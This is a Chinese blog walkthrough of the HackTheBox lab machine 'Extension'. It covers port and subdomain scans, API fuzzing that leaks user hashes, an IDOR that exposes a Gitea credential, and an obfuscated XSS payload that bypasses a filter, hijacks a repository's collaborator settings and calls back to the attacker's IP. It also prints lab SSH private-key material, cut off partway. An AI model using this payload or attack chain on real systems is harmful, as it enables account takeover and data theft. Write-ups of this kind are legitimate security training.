---
title: Extension - HackTheBox
url: https://darkwing.moe/2022/12/04/Extension-HackTheBox/
source: 喵喵喵喵
date: 2022-12-05
fetch_date: 2025-10-04T00:29:59.226317
---

# Extension - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Extension - HackTheBox

# Extension - HackTheBox

##### 2022-12-04

#### TOC

1. [1. 基本信息](#基本信息)
   1. [1.1. 10.10.11.171](#10-10-11-171)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. 子域名扫描](#子域名扫描)
   1. [3.1. dev](#dev)
   2. [3.2. mail](#mail)
4. [4. API fuzz](#API-fuzz)
   1. [4.1. management/dump](#management-dump)
5. [5. snippet](#snippet)
6. [6. Gitea](#Gitea)
   1. [6.1. xss](#xss)
7. [7. user flag](#user-flag)
   1. [7.1. charlie\_id\_rsa](#charlie-id-rsa)
8. [8. 提权信息](#提权信息)
9. [9. 命令注入](#命令注入)
10. [10. docker 逃逸 & root flag](#docker-逃逸-amp-root-flag)
    1. [10.1. shadow](#shadow)
    2. [10.2. root\_id\_rsa](#root-id-rsa)
11. [11. 参考资料](#参考资料)

# Extension - HackTheBox

2022-12-04

# 基本信息

* <https://www.hackthebox.com/home/machines/profile/482>
* ## 10.10.11.171

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120401.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.171 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-04 14:17 CST Nmap scan report for 10.10.11.171 Host is up (0.36s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   2048 8221e2a5824ddf3f99db3ed9b3265286 (RSA) |   256 913ab2922b637d91f1582b1b54f9703c (ECDSA) |_  256 6520392ba73b33e5ed49a9acea01bd37 (ED25519) 80/tcp open  http    nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: snippet.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 119.77 seconds ``` |

## 80

snippet.htb,需要账号密码登录

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120402.jpg)

# 子域名扫描

添加hosts后扫描子域名，得到dev和mail：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` 10.10.11.171 snippet.htb  ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u "http://snippet.htb/" -H 'Host: FUZZ.snippet.htb' -fl 30  dev                     [Status: 200, Size: 12822, Words: 1029, Lines: 250, Duration: 328ms] mail                    [Status: 200, Size: 5311, Words: 364, Lines: 97, Duration: 354ms] ``` |

## dev

一个gitea，注册账号登录后得到已有的几个有效用户名：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120403.jpg)

## mail

Roundcube Webmail:

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120404.jpg)

# API fuzz

主站源码中提取出路由信息：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120405.jpg)

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ``` | ``` curl -s 10.10.11.171 | grep Ziggy | sed 's/    const Ziggy = //' | jq | grep uri | awk '{print $2}' | tr -d '"",'  _ignition/health-check _ignition/execute-solution _ignition/share-report _ignition/scripts/{script} _ignition/styles/{style} dashboard users snippets snippets/{id} snippets/update/{id} snippets/update/{id} snippets/delete/{id} new management/validate management/dump register login forgot-password forgot-password reset-password/{token} reset-password verify-email verify-email/{id}/{hash} email/verification-notification confirm-password logout ``` |

## management/dump

fuzz参数，fuzz值，得到users信息，profile是空的：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120407.jpg)

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120408.jpg)

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120406.jpg)

破解出几个有效账号密码：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` gia@snippet.htb juliana@snippet.htb letha@snippet.htb fredrick@snippet.htb ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123 ``` |

# snippet

任意一个有效账号密码登录，查看snippets，只有一个可以查看的，修改id发现存在API，现在无权限查看：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120409.jpg)

自己创建一个snippet，更新信息时只保留public为true(重要，别把内容也给改了，那就只能reset了)，修改id为2，可以越权修改其他snippet的设置，从而查看id为2的snippet：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120410.jpg)

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120411.jpg)

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120412.jpg)

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` curl -XGET http://dev.snippet.htb/api/v1/users/jean/tokens -H 'accept: application/json' -H 'authorization: basic amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB'  jean:EHmfar1Y7ppA9O5TAIXnYnJpA ``` |

# Gitea

jean是gitea那里的有效用户，可以登录dev的gitea,查看代码发现对issue的XSS过滤：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120413.jpg)

str.replace 仅替换第一次出现的 <> 标签，因此我们可以使用两个 <> 标签来绕过它

查看设置可以发现charlie是合作者，所以可以通过issue xss去打charlie：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120414.jpg)

## xss

所以就是通过XSS把我们当前的jean用户加入到charlie的合作者中, 在charlie的repo中得到backup：

* XSS-Payloads/Without-Parentheses.md at master · RenwaX23/XSS-Payloads
  <https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md>

|  |  |
| --- | --- |
| ``` 1 ``` | ``` test<test><img SRC="x" onerror=eval.call`${"eval\x28atob`dmFyIHU9J2h0dHA6Ly9kZXYuc25pcHBldC5odGIvY2hhcmxpZS9iYWNrdXBzL3NldHRpbmdzL2NvbGxhYm9yYXRpb24nO2ZldGNoKHUpLnRoZW4ociA9PiBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdtZXRhW25hbWU9Il9jc3JmIl0nKS5jb250ZW50KS50aGVuKHQgPT4gZmV0Y2godSx7bWV0aG9kOidQT1NUJyxoZWFkZXJzOiB7J0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsnfSwgYm9keTonY29sbGFib3JhdG9yPWplYW4mX2NzcmY9Jyt0fSkudGhlbihkID0+IGZldGNoKCdodHRwOi8vMTAuMTAuMTQuMTAvP2RvbmUnKSkp`\x29"}`> ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120415.jpg)

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120416.jpg)

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120417.jpg)

# user flag

backup中得到charlie的ssh 私钥，登录，然后切换到jean用户，密码就是前面得到的，得到user flag：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120418.jpg)

## charlie\_id\_rsa

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 ``` | ``` -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEAx3BQ74w6hDrMrj5bxneqSvicR8WjTBF/BEIWdzJpvWi+9onO ufOUl0P+DE9YEv51HpOLqZ/ZuSUxzMV/Wf2Po4+aglepfGBx6GfuEm2mVH9x3T8p OZGWvs7qMMsh86ViyLwivMm0s/NdW8I0NnKVmN9DVksJL5VO++Pc4GCkBHqQEU1p V5FeCUX/ah8cllmGC/W4op0aVM9MTlzD5YB1IOTpZgo8dG1yvVpySHWqBuG/Hg4L A2/lLn0OBU1nj52v4dpwuJ+7RgicgGgrJfj6roHEDsdQFs5uv0v7roYboKnknLo6 Fiz2/eQtTVb176+AhSdgs3UPqj9A7QgxV0GY6wIDAQABAoIBAQCh1N6n8rbM81WB EjKwUgvJ+AAAMTw3jn7tup62LB8nReam8N3hf+iT8eUkogGKsBXjMMCEbKRkGu1V BvE22YyDoRQ0LePme/ASMLs7EuSD7kI70HOoNh4HSKk53Kr5JLuKvTbG0DmkR5b6 zRRHFiWTvZ7LV+nlRZeox5ZEL8cHpejKB5wBdVJ/UvHRs/XvvZv86JFagbbfzrH6 DJz4isE9SEFxcnWtKAnCz03CoP8mI0+5klIP359hkOKx1dYfSlc4zccZqU5y1Uiv tEtcEnvaPoARSuxA3hoN6wchnOvLbzFO2RN5vtxZ9YmztcelMOHLUrliun96sUgV 33XkTjPpAoGBAPIo0UfIT4XXscKNkSp1VXai9E3noH1E2q6fIccAvmpOA3I2AW7R eEe1OD3beuArgL+RVF8oJOAD+UkWn8CP2bXnnT11a753WGUnPIr5Q9Mm1rZcrCD2 EF5689eKSq49ecu2ISt3lyb4VMku1GXzQ3zaFELI8eSvTNXQjpLeAWBFAoGBANLW bQjQz81+dwud4grHGUCe2L9g0k/KmnJ//Q0+6iI9EGNmJLf5yHnYnqvIWWXSpOss Q3ZTJGWUHJ/vDlrSpauZ6FJM9X4YLJ2DsSPFcxfcps+Y1oGE8o9Q7XHqyE4UrDiM H36CsRGPNwmwNMNHUb/lkjELYKzSF58cTdA7Rp9vAoGBAOJL+qcWLhppoxioqwv+ cktXpO5YksX93k5pL2uE6mz1UoscpOImpjx8wX4s6PssLDjZWvtBzJP7oq4Gkmul AlLXiz2vyWxIozaEIDPPFO7x0JzCpah3ynxAcjbuaTPDB1qzbPPt4jbswm7vcFWF q3+1XFG87zBCEY+OQm5FQQvxAoGAfJZ3Mflqgm0T3cp7U5EZjAUR4e1N+haoM7cM CvK9mmPpNkOauRiibdYi1TH8Gd5i1BGA///bhycBz0SNf//wJDo7fb66ZrvUSXQT jibUfypFbHFNeJXeW/Afj+yEVxeCOZwb1D9YcR7nEBOO6kJPvYzkWZT2mMlBaiVo mf8dGYMCgYEA2Bqocj0mcncnt2m1F6Obp3ptv7zwF/upk70lC6z3uo1xTSfnGPP/ MaX9vAmUF9XNwolFVzU6STMreBPRsh...